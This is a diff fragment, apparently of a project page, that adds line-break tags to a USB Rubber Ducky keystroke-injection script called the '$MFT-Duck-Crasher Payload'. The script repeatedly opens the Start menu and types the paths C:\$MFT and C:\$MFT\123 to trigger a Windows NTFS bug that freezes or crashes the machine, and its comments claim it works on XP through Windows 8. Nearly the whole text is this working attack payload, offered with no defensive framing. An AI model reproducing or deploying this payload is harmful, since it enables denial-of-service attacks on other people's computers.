@@ -22,40 +22,72 @@ alt="$MFT" width="600" height="450" border="100" /></a>
 
 
 $MFT-Duck-Crasher Payload
-
+<br/>
+<br/>
 REM works on w7 - w8 - Vista (and i think xp and earlier too)
+<br/>
 REM it uses a high delay to support even older computers
+<br/>
 DELAY 1000
 <br/>
 CONTROL ESCAPE
+<br/>
 DELAY 500
+<br/>
 STRING C:\$MFT
+<br/>
 DELAY 500
+<br/>
 ENTER
+<br/>
 DELAY 700
+<br/>
 REM the 2nd enter is to close the error
+<br/>
 ENTER
+<br/>
 DELAY 500
+<br/>
 CONTROL ESCAPE
+<br/>
 DELAY 500
+<br/>
 STRING C:\$MFT\123
+<br/>
 DELAY 500
+<br/>
 ENTER
+<br/>
 DELAY 700
+<br/>
 ENTER
+<br/>
 DELAY 500
+<br/>
 CONTROL ESCAPE
+<br/>
 DELAY 500
+<br/>
 STRING C:\$MFT
+<br/>
 DELAY 500
+<br/>
 ENTER
+<br/>
 DELAY 700
+<br/>
 ENTER
+<br/>
 DELAY 500
+<br/>
 CONTROL ESCAPE
+<br/>
 DELAY 500
+<br/>
 STRING C:\$MFT\123
+<br/>
 DELAY 500
+<br/>
 ENTER
 DELAY 700
 ENTER
